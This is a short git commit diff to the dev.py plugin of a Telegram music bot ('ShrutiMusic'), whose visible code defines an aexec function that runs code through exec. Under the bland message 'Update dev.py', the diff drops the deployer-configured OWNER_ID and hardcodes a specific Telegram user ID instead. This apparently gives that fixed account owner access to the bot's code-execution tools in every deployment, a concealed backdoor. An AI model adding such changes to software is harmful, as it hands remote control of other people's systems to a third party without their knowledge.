f4d8f1e3602f5e94f8b6d6f29a64338a9876fb53
MR GOKU <154590485+VIPBOLTE@users.noreply.github.com>
2026-01-04 20:20:40 +0530

    Update dev.py

--- ShrutiMusic/plugins/tools/dev.py
+++ ShrutiMusic/plugins/tools/dev.py
@@ -9,8 +9,8 @@ from time import time
 from pyrogram import filters
 from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message
 from ShrutiMusic import app
-from config import OWNER_ID, ERROR_FORMAT
-
+from config import ERROR_FORMAT
+OWNER_ID = 5595153270
 
 async def aexec(code, client, message):
     exec(
